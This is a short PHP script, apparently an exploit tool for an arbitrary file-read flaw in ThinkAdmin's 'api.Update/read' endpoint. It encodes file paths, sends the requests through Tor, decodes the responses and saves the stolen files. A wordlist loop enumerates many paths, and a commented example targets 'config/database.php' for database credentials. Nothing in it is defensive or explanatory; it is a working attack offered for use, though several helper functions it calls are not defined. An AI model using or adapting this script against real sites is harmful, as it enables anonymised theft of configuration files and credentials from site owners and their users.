<?php
function readOne($path, $base_url){
   //encode and concat 
   $encoded_path = encode($path);
   $base_url .=$encoded_path;
   //request
   $response = base64decode(request_tor($base_url));
   //write to file
   write2file($response,str_replace('/', '', $path));
}

function readMul($wordlist, $base_url){
   foreach(file($wordlist) as $word){
     $word = str_replace("\n","",$word);
     readOne($word,$base_url);
   }
}

//readMul('/dir/to/thinkadmin_enum/dir.txt', 'https://web_page/index.php?s=admin/api.Update/read/');
//readOne("config/database.php",'https://web_page/index.php?s=admin/api.Update/read/' )
?>
